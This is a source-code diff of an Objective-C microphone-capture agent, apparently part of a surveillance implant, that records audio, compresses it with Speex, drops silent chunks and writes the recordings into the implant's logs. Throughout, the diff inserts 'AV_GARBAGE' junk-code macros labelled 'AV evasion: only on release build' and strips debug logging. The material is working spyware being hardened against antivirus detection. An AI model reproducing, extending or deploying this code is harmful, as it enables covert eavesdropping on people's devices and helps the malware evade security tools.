@@ -18,6 +18,8 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
+#import "RCSMAVGarbage.h"
+
 #define LOG_AUDIO_CODEC_SPEEX   0x00;
 #define LOG_AUDIO_CODEC_AMR     0x01;
 
@@ -31,29 +33,51 @@ void myInputAudioCallback(void                               *inUserData,
                           UInt32                             inNumPackets,
                           const AudioStreamPacketDescription *inPacketDescs)
 {
-#ifdef DEBUG_MIC
-  verboseLog(@"");
-#endif
-
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
 	//AQState_t *aqData = (AQState_t *)inUserData;
 	__m_MAgentMicrophone *aqData = (__m_MAgentMicrophone *)inUserData;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (inNumPackets                            == 0
       && aqData.mDataFormat.mBytesPerPacket  != 0)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       inNumPackets = inBuffer->mAudioDataByteSize
                      / aqData.mDataFormat.mBytesPerPacket;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (inNumPackets > 0)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       [aqData.mLockGeneric lock];
       [aqData.mAudioBuffer appendBytes: inBuffer->mAudioData
-                                length: inBuffer->mAudioDataByteSize];
-      aqData.mCurrentPacket += inNumPackets;
+                                length: inBuffer->mAudioDataByteSize];   
+    
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
+      aqData.mCurrentPacket += inNumPackets; 
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       [aqData.mLockGeneric unlock];
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (aqData.mIsRunning == 0)
     {
       return;
@@ -62,6 +86,10 @@ void myInputAudioCallback(void                               *inUserData,
   // 
   // If we're not stopping, re-enqueue the buffer so that it gets filled again
   //
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   AudioQueueEnqueueBuffer(aqData.mQueue, inBuffer, 0, NULL);
 }
 
@@ -80,54 +108,85 @@ void myInputAudioCallback(void                               *inUserData,
 
 - (int)_calculateBufferSizeForFormat: (const AudioStreamBasicDescription *)format
                          withSeconds: (float)seconds
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   int packets, frames, bytes = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   frames = (int)ceil(seconds * format->mSampleRate);
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (format->mBytesPerFrame > 0)
-    {
-#ifdef DEBUG_MIC
-      warnLog(@"mBytesPerFrame > 0");
-#endif
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       bytes = frames * format->mBytesPerFrame;
     }
   else
     {
       UInt32 maxPacketSize;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       if (format->mBytesPerPacket > 0)
         {
           maxPacketSize = format->mBytesPerPacket;	// constant packet size
         }
       else
-        {
-#ifdef DEBUG_MIC
-          infoLog(@"mBytesPerFrame = 0");
-#endif
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+        
 
-          UInt32 propertySize = sizeof(maxPacketSize);
+          UInt32 propertySize = sizeof(maxPacketSize);   
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
           AudioQueueGetProperty(mQueue,
                                 kAudioConverterPropertyMaximumOutputPacketSize,
                                 &maxPacketSize,
                                 &propertySize);
         }
       if (format->mFramesPerPacket > 0)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           packets = frames / format->mFramesPerPacket;
         }
       else
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+        
           packets = frames;	// worst-case scenario: 1 frame in a packet
         }
       if (packets == 0)		// sanity check
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+        
           packets = 1;
         }
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       bytes = packets * maxPacketSize;
     }
-
-#ifdef DEBUG_MIC
-  infoLog(@"calculated bytes: %d", bytes);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
 	return bytes;
 }
 
@@ -158,48 +217,75 @@ void myInputAudioCallback(void                               *inUserData,
   u_int complexity      = 1;
   u_int quality         = 5;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   // Create a new wide mode encoder
   speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_UWB));
   //speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_WB));
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // Set quality and complexity
-  speex_encoder_ctl(speexState, SPEEX_SET_QUALITY, &quality);
+  speex_encoder_ctl(speexState, SPEEX_SET_QUALITY, &quality);   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   speex_encoder_ctl(speexState, SPEEX_SET_COMPLEXITY, &complexity);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   speex_bits_init(&speexBits);
   
   // Get frame size for given quality and compression factor
   speex_encoder_ctl(speexState, SPEEX_GET_FRAME_SIZE, &frameSize);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (!frameSize)
-    {
-#ifdef DEBUG_MIC
-      errorLog(@"Error while getting frameSize from speex");
-#endif
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_007    
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       speex_bits_destroy(&speexBits);
       
       return FALSE;
     }
   
-#ifdef DEBUG_MIC
-  verboseLog(@"frameSize: %d", frameSize);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   //
   // Allocate the output buffer including the first dword (bufferSize)
   //
   if (!(outputBuffer = (char *)malloc(frameSize * SINGLE_LPCM_UNIT_SIZE + sizeof(u_int))))
-    {
-#ifdef DEBUG_MIC
-      errorLog(@"Error while allocating output buffer");
-#endif
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_004
       
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       speex_bits_destroy(&speexBits);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
       
       return FALSE;
     }
@@ -208,14 +294,20 @@ void myInputAudioCallback(void                               *inUserData,
   // Allocate the input buffer
   //
   if (!(inputBuffer = (SInt16 *)malloc(frameSize * sizeof(SInt16))))
-    {
-#ifdef DEBUG_MIC
-      errorLog(@"Error while allocating input float buffer");
-#endif
-      
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+    
       free(outputBuffer);
       speex_encoder_destroy(speexState);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       speex_bits_destroy(&speexBits);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       return FALSE;
     }
@@ -224,39 +316,78 @@ void myInputAudioCallback(void                               *inUserData,
   // Check for VAD
   //
   if (mIsVADActive)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       short prevBitSample = 0;
       u_int zeroRate      = 0;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       for (ptrSource = source;
            ptrSource + (frameSize  * SINGLE_LPCM_UNIT_SIZE * channels) <= source + audioChunkSize;
            ptrSource += (frameSize * SINGLE_LPCM_UNIT_SIZE * channels))
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+        
           bitSample = (SInt16 *)ptrSource;
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           prevBitSample = bitSample[0];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
           for (i = 1; i < frameSize; i++)
-            {
+            {   
+              // AV evasion: only on release build
+              AV_GARBAGE_002
+            
               if (prevBitSample * bitSample[i] < 0)
                 zeroRate++;
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_003
               
               prevBitSample = bitSample[i];
             }
         }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       float silencePresence = (float)(zeroRate / (audioChunkSize / (frameSize * SINGLE_LPCM_UNIT_SIZE)));
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       if (silencePresence >= (float)mSilenceThreshold)
-        {
-#ifdef DEBUG_MIC
-          warnLog(@"No voice detected, dropping the audio chunk");
-#endif
-          mLoTimestamp = 0;
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+        
+          mLoTimestamp = 0; 
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           mHiTimestamp = 0;
           
           free(outputBuffer);
           speex_encoder_destroy(speexState);
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           speex_bits_destroy(&speexBits);
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
           
           return FALSE;
         }
@@ -264,9 +395,8 @@ void myInputAudioCallback(void                               *inUserData,
   
   //NSMutableData *tempData = [[NSMutableData alloc] init];
   
-#ifdef DEBUG_MIC
-  verboseLog(@"Starting encoding");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
 
   //
   // We skip one channel by multiplying per channels inside the for condition
@@ -278,71 +408,108 @@ void myInputAudioCallback(void                               *inUserData,
     {
       bitSample = (SInt16 *)ptrSource;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       for (i = 0; i < frameSize; i ++)
-        {
+        {   
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+        
           // Just to avoid clipping on GSM with speex
           // 1.2db line loss
           inputBuffer[i] =  bitSample[i * channels] - (bitSample[i * channels] / 4);
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
         }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       speex_bits_reset(&speexBits);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       speex_encode_int(speexState, inputBuffer, &speexBits);
       //speex_encode_int(speexState, bitSample, &speexBits);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
       
       // Encode and store the result in the outputBuffer + first dword (length)
       bytesWritten = speex_bits_write(&speexBits,
                                       (char *)(outputBuffer + sizeof(u_int)),
                                       frameSize * SINGLE_LPCM_UNIT_SIZE);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       // If bytesWritten is greater than our condition, something wrong happened
       if (bytesWritten > (frameSize * SINGLE_LPCM_UNIT_SIZE))
         continue;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       // Store the audioChunk size in the first dword of outputBuffer
       memcpy(outputBuffer, &bytesWritten, sizeof(u_int));
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
       
       NSMutableData *tempData = [[NSMutableData alloc] initWithBytes: outputBuffer
                                                               length: bytesWritten + sizeof(u_int)];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       //[tempData appendBytes: outputBuffer length: bytesWritten + sizeof(u_int)];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       [_logManager writeDataToLog: tempData
                          forAgent: AGENT_MICROPHONE
                         withLogID: fileCounter];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       [tempData release];
       //usleep(2000);
     }
   
-#ifdef DEBUG_MIC
-  verboseLog(@"Finished encoding");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   //[_logManager writeDataToLog: tempData
                      //forAgent: LOG_MICROPHONE
                     //withLogID: fileCounter];
 
   //[tempData release];
-#ifdef DEBUG_ERRORS
-  time_t ut;
-  time(&ut);
   
-  NSString *outFile = [[NSString alloc] initWithFormat: @"/tmp/mic_speexEncoded-%d.wav", ut];
-  
-  [fileData writeToFile: outFile
-             atomically: YES];
-  
-  [outFile release];
-  [fileData release];
-  fileData = nil;
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   free(inputBuffer);
   free(outputBuffer);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   speex_encoder_destroy(speexState);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   speex_bits_destroy(&speexBits);
- 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   return TRUE;
 }
 
@@ -725,18 +892,23 @@ void myInputAudioCallback(void                               *inUserData,
 
 - (BOOL)stop
 {
-#ifdef DEBUG_MIC
-  verboseLog(@"");
-#endif
-
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   int internalCounter = 0;
   
   [mAgentConfiguration setObject: AGENT_STOP
                           forKey: @"status"];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [mLockGeneric lock];
   mFileCounter = 0;
   [mLockGeneric unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   while ([mAgentConfiguration objectForKey: @"status"]  != AGENT_STOPPED
          && internalCounter                             <= MAX_STOP_WAIT_TIME)
@@ -745,9 +917,8 @@ void myInputAudioCallback(void                               *inUserData,
       usleep(100000);
     }
   
-#ifdef DEBUG_MIC
-  infoLog(@"Agent Microphone stopped");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   return YES;
 }
@@ -760,18 +931,28 @@ void myInputAudioCallback(void                               *inUserData,
   if (mIsRunning == YES)
   {
     // We're already running
-#ifdef DEBUG_MIC
-    warnLog(@"Agent Mic already running");
-#endif
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     [outerPool release];
     return;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [mAgentConfiguration setObject: AGENT_RUNNING
                           forKey: @"status"];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSDate *micStartedDate = [NSDate date];
   NSTimeInterval interval = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   //
   // Grab config parameters
@@ -780,22 +961,42 @@ void myInputAudioCallback(void                               *inUserData,
   microphoneRawData = (microphoneAgentStruct *)[[mAgentConfiguration
                                                  objectForKey: @"data"] bytes];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   //
   // Set config parameters
   //
   mIsVADActive      = microphoneRawData->detectSilence;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   mSilenceThreshold = microphoneRawData->silenceThreshold;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   //
   // Start recording
   //
   [self startRecord];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   while ([mAgentConfiguration objectForKey: @"status"]    != AGENT_STOP
          && [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
   {
     NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     interval = [[NSDate date] timeIntervalSinceDate: micStartedDate];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_004
     
     if (fabs(interval) >= 20)
     {
@@ -803,40 +1004,59 @@ void myInputAudioCallback(void                               *inUserData,
       //          fileCounter    = mFileCounter;
       //          [mLockGeneric unlock];
       
-#ifdef DEBUG_MIC
-      infoLog(@"Logging #%d", fileCounter);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       //          [NSThread detachNewThreadSelector: @selector(generateLog)
       //                                   toTarget: self
       //                                 withObject: nil];
       [self generateLog];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       micStartedDate = [[NSDate date] retain];
     }
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_008
     
     [innerPool drain];
     usleep(5000);
   }
   
-#ifdef DEBUG_MIC
-  infoLog(@"Exiting microphone");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if (mIsRunning)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
     [self stopRecord];
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
   {      
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     mIsRunning = FALSE;
     [mAgentConfiguration setObject: AGENT_STOPPED
                             forKey: @"status"];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
     mLoTimestamp = 0;
     mHiTimestamp = 0;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [outerPool release];
 }
@@ -846,14 +1066,23 @@ void myInputAudioCallback(void                               *inUserData,
 #pragma mark -
 
 - (NSMutableDictionary *)mAgentConfiguration
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return mAgentConfiguration;
 }
 
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (aConfiguration != mAgentConfiguration)
-    {
+    {   
+     // AV evasion: only on release build
+     AV_GARBAGE_001
+    
       [mAgentConfiguration release];
       mAgentConfiguration = [aConfiguration retain];
     }
